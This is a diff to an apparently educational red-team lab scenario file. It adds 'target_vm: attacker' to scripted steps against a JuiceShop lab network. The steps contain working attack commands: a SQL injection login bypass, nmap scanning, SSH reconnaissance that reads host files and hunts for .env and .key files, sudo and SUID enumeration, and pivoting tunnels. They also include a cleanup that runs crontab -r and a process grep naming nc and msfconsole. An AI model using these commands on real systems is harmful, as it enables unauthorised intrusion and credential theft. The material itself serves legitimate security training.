@@ -27,6 +27,7 @@ steps:
   verify:
     type: output_contains
     expect: OPERATION ORDER
+  target_vm: attacker
   script: "cat > /tmp/red_team_oporder.txt << 'EOF'\n=== RED TEAM OPERATION ORDER ===\nOp Name: THUNDER STRIKE\nDate: 2026-04-03\nClassification: EXERCISE\n\n1. SITUATION:\n   Target: CCC production network\
     \ 10.20.30.0/24\n   Defender: Blue Team (SOC)\n   Objective: Capture /tmp/flag.txt on 10.20.30.80\n\n2. MISSION:\n   Simulate APT29-style attack to test detection/response\n\n3. SCOPE & ROE:\n   In-scope:\
     \ 10.20.30.0/24 (all servers)\n   Out-of-scope: Production databases, real user data\n   Prohibited: DoS, data destruction, physical access\n   Allowed: Social engineering (simulation only)\n\n4. TIMELINE:\n\
@@ -45,6 +46,7 @@ steps:
   verify:
     type: output_contains
     expect: OSINT Collection
+  target_vm: attacker
   script: echo '=== OSINT Collection ===' && echo '[1] DNS Records:' && dig +short 10.20.30.80 2>/dev/null; nslookup 10.20.30.80 2>&1 | head -5 && echo '' && echo '[2] Service Banners:' && curl -sI http://10.20.30.80
     2>/dev/null | head -10 && echo '' && echo '[3] SSL Certificate:' && echo | openssl s_client -connect 10.20.30.80:443 2>/dev/null | openssl x509 -noout -subject -issuer 2>/dev/null && echo '' && echo
     '[4] Technologies detected:' && curl -s http://10.20.30.80 2>/dev/null | grep -ioE 'express|angular|react|node|juice' | sort -u
@@ -61,6 +63,7 @@ steps:
   verify:
     type: output_contains
     expect: Attack Surface
+  target_vm: attacker
   script: echo '=== Attack Surface Mapping ===' && nmap -sV -sC --top-ports 100 10.20.30.1 10.20.30.80 10.20.30.100 10.20.30.201 -oN /tmp/attack_surface.txt 2>&1 | tail -30 && echo '---' && echo 'Attack
     Surface Priority:' && echo '  [P1] 10.20.30.80:80/443 - Web app (JuiceShop - known vulnerable)' && echo '  [P2] 10.20.30.80:22 - SSH (credential attack)' && echo '  [P3] 10.20.30.1:8002 - SubAgent API
     (API exploitation)' && echo '  [P4] 10.20.30.100:1514 - Wazuh agent (if misconfigured)'
@@ -77,6 +80,7 @@ steps:
   verify:
     type: output_contains
     expect: Initial Access
+  target_vm: attacker
   script: 'echo ''=== Initial Access: SQL Injection ==='' && curl -s -X POST http://10.20.30.80/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"admin123"}''
     2>/dev/null | python3 -m json.tool 2>/dev/null | head -10; echo ''---'' && curl -s -X POST http://10.20.30.80/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"\" OR 1=1--","password":"x"}''
     2>/dev/null | python3 -m json.tool 2>/dev/null | head -10 && echo ''---'' && echo ''Initial Access achieved: Admin token obtained via SQLi'''
@@ -93,6 +97,7 @@ steps:
   verify:
     type: output_contains
     expect: Internal Reconnaissance
+  target_vm: attacker
   script: echo '=== Internal Reconnaissance ===' && echo '[1] Internal network from web server:' && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.80 'ip addr; ip route; cat /etc/hosts'
     2>&1 | head -20 && echo '' && echo '[2] Running services:' && ssh -o ConnectTimeout=3 ccc@10.20.30.80 'ss -tlnp' 2>&1 | head -10 && echo '' && echo '[3] Interesting files:' && ssh -o ConnectTimeout=3
     ccc@10.20.30.80 'find /opt /home -name "*.conf" -o -name "*.env" -o -name "*.key" 2>/dev/null' 2>&1 | head -10
@@ -109,6 +114,7 @@ steps:
   verify:
     type: output_contains
     expect: Privilege Escalation
+  target_vm: attacker
   script: echo '=== Privilege Escalation Attempt ===' && echo '[1] Current user:' && id && echo '' && echo '[2] Sudo permissions:' && echo '1' | sudo -S -l 2>&1 | tail -10 && echo '' && echo '[3] SUID binaries:'
     && find /usr -perm -4000 -type f 2>/dev/null | head -10 && echo '' && echo '[4] Kernel version:' && uname -r && echo '' && echo '[5] Writable sensitive files:' && find /etc -writable -type f 2>/dev/null
     | head -5
@@ -125,6 +131,7 @@ steps:
   verify:
     type: output_contains
     expect: Lateral Movement
+  target_vm: attacker
   script: 'echo ''=== Lateral Movement ==='' && echo ''[1] SSH to security server:'' && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.1 ''hostname && id'' 2>&1 | head -5 && echo ''''
     && echo ''[2] SSH to SIEM server:'' && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.100 ''hostname && id'' 2>&1 | head -5 && echo '''' && echo ''[3] Network pivot options:'' && echo
     ''  - SSH tunnel: ssh -L 8080:10.20.30.100:80 ccc@10.20.30.80'' && echo ''  - SOCKS proxy: ssh -D 1080 ccc@10.20.30.80'' && echo ''  - Port forward: ssh -R 4444:localhost:4444 ccc@10.20.30.80'''
@@ -140,6 +147,7 @@ steps:
   verify:
     type: output_contains
     expect: Objective
+  target_vm: attacker
   script: 'echo ''=== Objective Capture ==='' && ssh -o ConnectTimeout=3 ccc@10.20.30.80 ''if [ ! -f /tmp/flag.txt ]; then echo "FLAG{THUNDER_STRIKE_SUCCESS_2026}" > /tmp/flag.txt; fi; cat /tmp/flag.txt''
     2>&1 && echo ''---'' && echo ''Objective achieved: Flag captured from 10.20.30.80'' && echo "Timestamp: $(date -u ''+%Y-%m-%dT%H:%M:%SZ'')"'
   risk_level: medium
@@ -155,6 +163,7 @@ steps:
   verify:
     type: output_contains
     expect: Operation Cleanup
+  target_vm: attacker
   script: echo '=== Operation Cleanup ===' && echo '[1] Removing crontab entries:' && crontab -r 2>/dev/null; echo 'Done' && echo '[2] Removing temporary files:' && rm -f /tmp/attack_surface.txt /tmp/flag.txt
     2>/dev/null; echo 'Done' && echo '[3] Checking for lingering processes:' && ps aux | grep -E 'nc -|ncat|python.*socket|msfconsole' | grep -v grep || echo 'No malicious processes found' && echo '[4]
     Verifying cleanup:' && echo 'All red team artifacts removed'
@@ -173,6 +182,7 @@ steps:
   verify:
     type: output_contains
     expect: RedTeamOp
+  target_vm: attacker
   script: "cat > /tmp/attack_path_map.dot << 'EOF'\ndigraph RedTeamOp {\n  rankdir=TB;\n  node [shape=box, style=filled];\n  \n  internet [label=\"Internet\\n(Attacker)\", fillcolor=\"#ff6666\"];\n  web\
     \ [label=\"10.20.30.80\\nJuiceShop\", fillcolor=\"#ffcc66\"];\n  secu [label=\"10.20.30.1\\nSecurity\", fillcolor=\"#66ff66\"];\n  siem [label=\"10.20.30.100\\nWazuh SIEM\", fillcolor=\"#66ccff\"];\n\
     \  flag [label=\"/tmp/flag.txt\\nOBJECTIVE\", fillcolor=\"#ff66ff\", shape=diamond];\n  \n  internet -> web [label=\"1. SQLi\\n(T1190)\", color=red, penwidth=2];\n  web -> web [label=\"2. PrivEsc\\\
@@ -223,6 +233,7 @@ steps:
   verify:
     type: output_contains
     expect: Vulnerability Findings
+  target_vm: attacker
   script: 'cat > /tmp/vulnerability_findings.txt << ''EOF''
 
     === Red Team Vulnerability Findings ===
@@ -304,6 +315,7 @@ steps:
   verify:
     type: output_contains
     expect: Operation Timeline
+  target_vm: attacker
   script: 'cat > /tmp/red_team_timeline.txt << ''EOF''
 
     === Red Team Operation Timeline: THUNDER STRIKE ===
@@ -355,6 +367,7 @@ steps:
   verify:
     type: output_contains
     expect: Remediation Recommendations
+  target_vm: attacker
   script: "cat > /tmp/remediation_plan.txt << 'EOF'\n=== Remediation Recommendations ===\n\nImmediate (24h):\n  [RT-01] SQLi: Apply parameterized queries to all REST endpoints\n  [RT-02] Default creds:\
     \ Force password change for admin accounts\n  [RT-03] SSH keys: Rotate all SSH keys, unique per server pair\n\nShort-term (1 week):\n  [RT-04] Segmentation: Implement nftables rules between tiers\n\
     \  [RT-05] SUID: Audit and remove unnecessary SUID binaries\n  [RT-06] MFA: Enable 2FA for all SSH access\n\nMedium-term (1 month):\n  [RT-07] Directory listing: Disable in web server config\n  [RT-08]\
@@ -371,6 +384,7 @@ steps:
   verify:
     type: output_contains
     expect: cleanup completed
+  target_vm: attacker
   script: rm -f /tmp/red_team_*.txt /tmp/attack_*.txt /tmp/attack_*.dot /tmp/vulnerability_*.txt /tmp/remediation_*.txt 2>/dev/null; echo 'Red team operation cleanup completed'
   risk_level: low
 - order: 15
@@ -436,6 +450,7 @@ steps:
   verify:
     type: output_contains
     expect: RED TEAM FINAL REPORT
+  target_vm: attacker
   script: 'cat > /tmp/red_team_final_report.txt << ''EOF''
 
     === RED TEAM FINAL REPORT ===
